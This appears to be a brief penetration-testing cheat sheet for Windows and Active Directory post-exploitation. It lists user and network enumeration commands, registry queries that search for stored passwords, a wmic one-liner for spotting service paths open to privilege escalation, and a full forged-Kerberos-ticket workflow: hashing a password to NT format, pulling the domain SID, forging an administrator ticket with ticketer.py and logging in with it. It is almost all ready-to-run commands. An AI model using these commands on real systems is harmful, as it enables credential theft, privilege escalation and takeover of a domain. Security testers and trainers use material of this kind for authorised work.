System browsing:
```powershell
net user
```

```powershell
net user $USER
```

```powershell
netstat -an
netstat -an | findstr $PORT
```
Search for passwords inside the registry
---
```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Find misconfigured services (default settings)
---
```powershell
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Golden ticket:
---
generate user password hash:

```python
import hashlib
hashlib.new('md4', '$PASSWORD'.encode('utf-16le')).digest().hex()
# save hash for later
```

or use

```url
https://gchq.github.io/CyberChef/#recipe=NT_Hash()
```

```powershell
get-addomain
#extract DomainSID
```

```shell
ticketer.py -nthash $HASH -domainsid $DOMAINSID -domain $DOMAIN -spn AnyName/$DCDOMAIN administrator
```

```shell
KRB5CCNAME=administrator.ccache mssqlclient.py -k administrator@$DCDOMAIN
```